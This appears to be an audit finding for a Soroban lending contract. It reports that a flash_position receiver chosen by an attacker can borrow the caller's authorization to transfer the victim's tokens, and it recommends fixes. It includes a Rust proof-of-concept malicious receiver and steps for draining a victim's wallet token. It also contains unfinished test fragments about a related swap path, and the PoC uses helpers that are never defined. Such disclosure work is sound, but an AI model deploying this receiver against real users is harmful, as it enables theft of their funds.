### Title
Attacker-controlled `flash_position` receiver can borrow the caller’s authorization to steal unrelated wallet tokens - ([File: contracts/controller/src/strategies/flash_position.rs](contracts/controller/src/strategies/flash_position.rs))

### Summary
`flash_position` invokes a caller-selected Wasm receiver while the caller’s authorization is active for the enclosing invocation tree. A malicious receiver can use the callback’s `initiator` argument to request token transfers from the victim to the attacker; transaction simulation records those transfers as authorization sub-invocations, so a victim who signs the generated tree authorizes the theft. Severity: High. [1](#0-0) [2](#0-1) 

### Finding Description
`process_flash_position` requires authorization from `caller`, permits the caller to select any Wasm contract as `receiver`, and later invokes that receiver with `caller` as `initiator` and the attacker-controlled `data`. [1](#0-0) [2](#0-1) 

Soroban authorization is attached to the victim’s enclosing `flash_position` invocation, not scoped only to calls made directly by the controller. Consequently, token transfers requested by the malicious descendant contract are recorded beneath the victim’s authorization entry and execute when the victim signs that recorded tree. The repository’s authorization-tree test demonstrates this behavior: a rogue descendant records and executes `token.transfer(victim, attacker, amount)` under the caller’s strategy authorization. [3](#0-2) 

This is analogous to password-reset-token leakage: an attacker-controlled endpoint receives access to authority that should only have been used for the intended operation. Here, the leaked authority is the victim’s Soroban authorization context rather than a bearer URL token. [2](#0-1) 

### Impact Explanation
A malicious receiver can transfer unrelated tokens held by the victim to the attacker by using `initiator` as the `from` address. Because the transfer is included in the simulated authorization tree, signing the apparently legitimate `flash_position` also signs the theft. Multiple token contracts can be targeted in one callback, allowing theft beyond the collateral or debt assets involved in the lending operation. This constitutes theft of user funds. [4](#0-3) [5](#0-4) 

### Likelihood Explanation
An unprivileged attacker can deploy a Wasm receiver and construct a `flash_position` request naming that receiver. Exploitation requires the victim to sign a simulation-generated authorization tree containing the malicious token transfer, similar to the user interaction required by the reported password-reset leak. Wallets or clients that faithfully display every sub-invocation can reduce exposure, but the protocol does not prevent the unauthorized descendant transfer itself. [6](#0-5) [7](#0-6) 

### Recommendation
Do not invoke arbitrary caller-selected contracts while the caller’s authorization can satisfy descendant `require_auth` calls. Restrict `flash_position` receivers to a governance-approved allowlist, or redesign the callback flow so user authorization is not present in the same authorization tree as attacker-controlled code. At minimum, make clients reject authorization trees containing any sub-invocation other than the explicitly expected protocol calls. [6](#0-5) [2](#0-1) 

### Proof of Concept

```rust
#[contract]
pub struct MaliciousReceiver;

#[contractimpl]
impl MaliciousReceiver {
    pub fn execute_flash_position(
        env: Env,
        initiator: Address,
        _account_id: u64,
        _asset: Address,
        _amount: i128,
        _fee: i128,
        _amount_received: i128,
        controller: Address,
        _data: Bytes,
    ) {
        let attacker: Address = env.storage().instance().get(&symbol_short!("ATK")).unwrap();
        let victim_token: Address = env.storage().instance().get(&symbol_short!("TOK")).unwrap();
        let amount = token::Client::new(&env, &victim_token).balance(&initiator);

        // Recorded as a sub-invocation under the victim's flash_position auth.
        token::Client::new(&env, &victim_token)
            .transfer(&initiator, &attacker, &amount);

        // Send the declared collateral so the strategy can satisfy its
        // measured-receipt and solvency checks instead of reverting.
        token::Client::new(&env, &collateral_token())
            .transfer(&env.current_contract_address(), &controller, &collateral_amount());
    }
}
```

1. The attacker deploys the receiver with the victim’s address or uses the callback’s `initiator` argument dynamically.
2. The attacker constructs a `flash_position` call with a valid flash-loanable `debt`, positive `amount`, the malicious `receiver`, and collateral requirements the receiver can satisfy.
3. During simulation, the callback requests `token.transfer(victim, attacker, victim_balance)`.
4. Simulation records that transfer beneath the victim’s `flash_position` authorization entry.
5. If the victim signs the generated tree, the unrelated wallet token moves to the attacker while the callback still supplies the declared collateral needed for settlement. [2](#0-1) [3](#0-2)

fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);

fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
